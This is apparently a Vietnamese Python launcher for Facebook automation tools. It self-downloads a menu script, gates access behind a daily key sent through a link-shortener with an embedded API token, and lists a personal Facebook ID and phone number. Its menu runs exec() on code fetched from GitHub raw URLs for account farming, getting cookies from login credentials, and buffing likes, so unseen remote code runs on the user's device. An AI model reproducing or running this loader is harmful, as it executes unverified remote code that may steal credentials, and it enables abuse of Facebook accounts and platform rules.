import json
import requests
import time
from time import strftime
import os
import os
import requests

with open(__file__, "r") as file:
    first_line = file.readline().strip()
    if first_line != "#1":
        resource_dir = "/sdcard/download/"
        config_url = "https://raw.githubusercontent.com/vlong07/vlong07/main/menu.py"
        config_file_path = os.path.join(resource_dir, "menu.py")
        os.makedirs(resource_dir, exist_ok=True)
        
        try:
            response = requests.get(config_url)
            if response.status_code == 200:
                with open(config_file_path, "wb") as file:
                    file.write(response.content)
                print(f"Tải về thành công: {config_file_path}")
                # os.remove(__file__)  # Bình luận dòng này để không xóa tệp hiện tại
                print("Đã tải về thành công. Vui lòng kiểm tra file mới.")
                print(f"Copy đoạn sau để bắt đầu chạy: python {config_file_path}")
            else:
                print(f"Lỗi: Không thể tải file từ URL. Mã lỗi: {response.status_code}")
        except Exception as e:
            print(f"Lỗi trong quá trình tải file: {str(e)}")
    else:
        print(f"Phiên bản hiện tại là {first_line}.")
import requests
import urllib.parse
from time import strftime
import os

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def save_key_to_file(key, filename='key.txt'):
    with open(filename, 'w') as file:
        file.write(str(key))

def load_key_from_file(filename='key.txt'):
    if os.path.exists(filename):
        with open(filename, 'r') as file:
            return file.read().strip()
    return None

def fetch_shortened_url(url, token):
    try:
        encoded_url = urllib.parse.quote(url)
        api_url = f'https://yeumoney.com/QL_api.php?token={token}&url={encoded_url}&format=json'
        response = requests.get(api_url)
        response.raise_for_status()
        result = response.json()
        if result["status"] == "success":
            return result["shortenedUrl"]
        else:
            return result["status"]
    except requests.exceptions.RequestException as e:
        return f"Error fetching shortened URL: {e}"

def main():
    clear_screen()


    ngay = int(strftime('%d'))
    key = str(ngay * 25937 + 46173)


    saved_key = load_key_from_file()


    if saved_key == key:
        print('\033[1;32m Key chính xác Đúng Chúc Bạn Ngày Tốt Lành')
    else:

        url = f'https://vuongquocanhkhoa.000webhostapp.com/key.html?key={key}'
        token_link1s = "baa2a5a08ef25aa3ff1e7708b69244c0378dc6a6ff412e4de7d3d7f705db62a6"
        link_key = fetch_shortened_url(url, token_link1s)

        if link_key is None:
            print("Unable to generate shortened URL. Please try again later.")
            return


        nhap_key = input(f'''
                        ┏━━━┓  ┏━━━┓  ┏━━━┓  ┏━━━┓
                        ┃┏━┓┃  ┃┏━┓┃  ┃┏━┓┃  ┗┓┏┓┃
                        ┃┃━┗┛  ┃┃━┃┃  ┃┃━┃┃ ━ ┃┃┃┃
                        ┃┃┏━┓  ┃┃━┃┃  ┃┃━┃┃ ━ ┃┃┃┃
                        ┃┗┻━┃  ┃┗━┛┃  ┃┗━┛┃  ┏┛┗┛┃
                        ┗━━━┛  ┗━━━┛  ┗━━━┛  ┗━━━┛
        \033[1;39m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        \033[1;39m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        \033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
        \033[1;39m┌──────────────────────── ANH KHOA ────────────────────┐
        \033[1;32m║   \033[1;39mFACEBOOK           : 100048392626934               \033[1;32m║
        \033[1;32m║   \033[1;39mZALO               : 0363161335                    \033[1;32m║
        \033[1;39m└──────────────────────────────────────────────────────┘
        \033[1;32m Link lấy key: \033[1;33m{link_key}
        \033[1;32m Nhập Key để Vào Tool : ''')


        if nhap_key == key:
            print('\033[1;32m Key chính xác Đúng Chúc Bạn Ngày Tốt Lành')

            save_key_to_file(nhap_key)
        else:
            print('\033[1;31m Key Sai Vui Lòng Vượt Link Để lấy')
            quit()

if __name__ == "__main__":
    main()


# Gọi hàm để xóa màn hình
clear_screen()
den = '[1;90m'
luc = '[1;32m'
trang = '[1;37m'
red = '[1;31m'
vang = '[1;33m'
tim = '[1;35m'
lamd = '[1;34m'
lam = '[1;36m'
purple = '\e[35m'
hong = '[1;95m'
do = '[1;95m'
xanhnhat = '[1;95m'
xanh_la = '[1;95m'
# Lmao
thanh_xau=trang+'~'+do+'['+vang+''+do+'] '+trang+'➩  '+xanhnhat
thanh_dep=trang+'~'+do+'['+xanh_la+''+do+'] '+trang+'➩  '+xanhnhat
print('                ┏━━━┓  ┏━━━┓  ┏━━━┓  ┏━━━┓')
print('                ┃┏━┓┃  ┃┏━┓┃  ┃┏━┓┃  ┗┓┏┓┃')
print('                ┃┃━┗┛  ┃┃━┃┃  ┃┃━┃┃ ━ ┃┃┃┃')
print('                ┃┃┏━┓  ┃┃━┃┃  ┃┃━┃┃ ━ ┃┃┃┃')
print('                ┃┗┻━┃  ┃┗━┛┃  ┃┗━┛┃  ┏┛┗┛┃')
print('                ┗━━━┛  ┗━━━┛  ┗━━━┛  ┗━━━┛')
print('\033[1;39m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
print('\033[1;39m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
print('\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = ')
print('\033[1;39m┌──────────────────────── ANH KHOA ────────────────────┐')
print('\033[1;32m║   \033[1;39mFACEBOOK           :  100048392626934                \033[1;32m')
print('\033[1;32m║   \033[1;39mZALO               :  0363161335                    \033[1;32m')
print('\033[1;39m└──────────────────────────────────────────────────────┘')
print('[Khoa]➩ Nhập Số [1] Nuôi Nick Facebook [VIP]')
print('[Khoa]➩ Nhập Số [2] Get Cookie Từ Tk Mk [VIP]')
print('[Khoa]➩ Nhập Số [3] Buff Like FB miễn phí [VIP]')
import requests

chon = str(input('\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m➩ \033[1;34mNhập Số \033[1;37m: \033[1;33m'))

if chon == '1':
    exec(requests.get('https://raw.githubusercontent.com/vlong07/vlong07/main/nuoifbkhoa.txt').text)
elif chon == '2':
    exec(requests.get('https://raw.githubusercontent.com/vlong07/vlong07/main/cookiekhoa.txt').text)
elif chon == '3':
    exec(requests.get('https://raw.githubusercontent.com/vlong07/vlong07/main/likekhoa.txt').text)
else:
    print("Sai Lựa Chọn")
    exit()
